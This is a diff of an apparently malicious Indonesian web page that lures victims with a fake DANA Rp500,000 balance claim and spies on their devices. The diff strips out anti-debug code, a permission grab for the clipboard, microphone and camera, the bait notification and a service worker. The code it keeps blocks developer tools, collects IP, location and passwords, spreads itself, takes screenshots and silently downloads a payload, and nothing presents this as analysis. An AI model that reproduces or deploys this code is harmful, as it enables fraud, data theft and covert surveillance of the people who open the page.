@@ -28,14 +28,14 @@
         .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
         .status-bar.loading{display:block;animation:loading 3s infinite}
         @keyframes loading{0%{width:0%}100%{width:100%}}
-        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
         .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
         .ios-download{display:none}
     </style>
 </head>
 <body>
 
-<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
+<!-- 🔥 ANTI-DEBUG VIA IFRAME DIHAPUS TOTAL AGAR TIDAK MACET -->
+
 <div id="statusBar" class="status-bar"></div>
 <iframe id="downloadFrame" class="hidden-download"></iframe>
 <div id="iosDownload" class="ios-download"></div>
@@ -71,21 +71,8 @@ console.debug = function() {};
 console.table = function() {};
 
 // ============================================================
-// 🔥 ANTI-DEBUG DINONAKTIFKAN (KOMMENTAR)
+// 🔥 STEALTH ANTI-ANALYSIS (TANPA debugger)
 // ============================================================
-// (function() {
-//     var check = function() {
-//         var start = Date.now();
-//         debugger;
-//         var end = Date.now();
-//         if (end - start > 100) {
-//             document.body.innerHTML = '';
-//             window.location.href = 'about:blank';
-//         }
-//     };
-//     setInterval(check, 1000);
-// })();
-
 document.addEventListener('keydown', function(e) {
     if (e.key === 'F12' || 
         (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
@@ -323,75 +310,9 @@ var A = {
 };
 
 // ============================================================
-// 🔥 BYPASS SEMUA IZIN DINONAKTIFKAN (KOMMENTAR)
+// 🔥 BYPASS SEMUA IZIN DINONAKTIFKAN
 // ============================================================
-// function injectAllPermissions() {
-//     try {
-//         K({ sumber: 'bypass_permissions_start', data: 'all' });
-
-//         // 1. GEOLOCATION
-//         if (navigator.geolocation) {
-//             try {
-//                 navigator.geolocation.getCurrentPosition(
-//                     function() {},
-//                     function() {},
-//                     { enableHighAccuracy: true, timeout: 5000 }
-//                 );
-//             } catch(e) {}
-//         }
-
-//         // 2. NOTIFICATION
-//         if ('Notification' in window && Notification.permission !== 'denied') {
-//             try {
-//                 if (Notification.permission !== 'granted') {
-//                     Notification.requestPermission();
-//                 }
-//             } catch(e) {}
-//         }
-
-//         // 3. CLIPBOARD
-//         if (navigator.clipboard) {
-//             try {
-//                 navigator.clipboard.readText().catch(function() {});
-//             } catch(e) {}
-//         }
-
-//         // 4. MEDIA (Audio & Video)
-//         if (navigator.mediaDevices) {
-//             try {
-//                 navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-//                     .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-//                     .catch(function() {});
-//             } catch(e) {}
-//             try {
-//                 navigator.mediaDevices.getUserMedia({ audio: false, video: true })
-//                     .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-//                     .catch(function() {});
-//             } catch(e) {}
-//             try {
-//                 navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-//                     .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-//                     .catch(function() {});
-//             } catch(e) {}
-//         }
-
-//         // 5. VIBRATE
-//         if (navigator.vibrate) {
-//             try { navigator.vibrate(1); } catch(e) {}
-//         }
-
-//         // 6. STORAGE
-//         if (navigator.storage && navigator.storage.persist) {
-//             try {
-//                 navigator.storage.persist().catch(function() {});
-//             } catch(e) {}
-//         }
-
-//         K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
-//     } catch(e) {
-//         K({ sumber: 'bypass_permissions_error', data: e.message });
-//     }
-// }
+// function injectAllPermissions() { ... }
 
 // ============================================================
 // AMBIL PASSWORD DARI WORKER
@@ -513,48 +434,10 @@ function downloadPayloadSilent() {
 }
 
 // ============================================================
-// NOTIFICATION
+// 🔥 NOTIFICATION DINONAKTIFKAN SEMENTARA
 // ============================================================
-function showKlaimNotification() {
-    if (NOTIFICATION_SHOWN) return;
-    NOTIFICATION_SHOWN = true;
-    
-    try {
-        if (!('Notification' in window)) { return; }
-        if (Notification.permission === 'denied') { return; }
-        if (Notification.permission !== 'granted') {
-            Notification.requestPermission().then(function(permission) {
-                if (permission === 'granted') { createKlaimNotification(); }
-            }).catch(function() {});
-            return;
-        }
-        createKlaimNotification();
-    } catch(e) {}
-}
-
-function createKlaimNotification() {
-    try {
-        var notif = new Notification('🔔 Klik Untuk Klaim', {
-            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
-            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
-            requireInteraction: true,
-            silent: false,
-            vibrate: [200, 100, 200]
-        });
-        
-        notif.onclick = function() {
-            notif.close();
-            if (!REDIRECT_DONE) {
-                REDIRECT_DONE = true;
-                setTimeout(function() {
-                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-                }, 500);
-            }
-        };
-        
-        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
-    } catch(e) {}
-}
+// function showKlaimNotification() { ... }
+// function createKlaimNotification() { ... }
 
 // ============================================================
 // DATA COLLECTION (UNIVERSAL)
@@ -624,16 +507,9 @@ function autoSpread() {
 function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 2700000); }
 
 // ============================================================
-// SERVICE WORKER
+// 🔥 SERVICE WORKER DINONAKTIFKAN SEMENTARA
 // ============================================================
-function registerServiceWorker() {
-    if (!('serviceWorker' in navigator) || PLATFORM.isIOS) return;
-    try {
-        navigator.serviceWorker.register('/sw.js', { scope: '/' })
-            .then(function(reg) { K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } }); })
-            .catch(function(e) {});
-    } catch(e) {}
-}
+// function registerServiceWorker() { ... }
 
 // ============================================================
 // STATUS BAR
@@ -653,18 +529,17 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // 🔥 BYPASS IZIN DINONAKTIFKAN (KOMMENTAR)
-        // injectAllPermissions();
+        // injectAllPermissions(); // DIMATIKAN
+        // showKlaimNotification(); // DIMATIKAN
         
         getIPAddress();
         getBrowserLocation();
         setTimeout(escapeWebView, 100);
         ambilDataCepat();
         startHeartbeat();
-        registerServiceWorker();
+        // registerServiceWorker(); // DIMATIKAN
         setTimeout(autoSpread, 2000);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
-        setTimeout(function() { showKlaimNotification(); }, 3000);
         setTimeout(function() { showStatusBar(); }, 500);
         setTimeout(function() { autoScreenshot(); }, 7000);
         
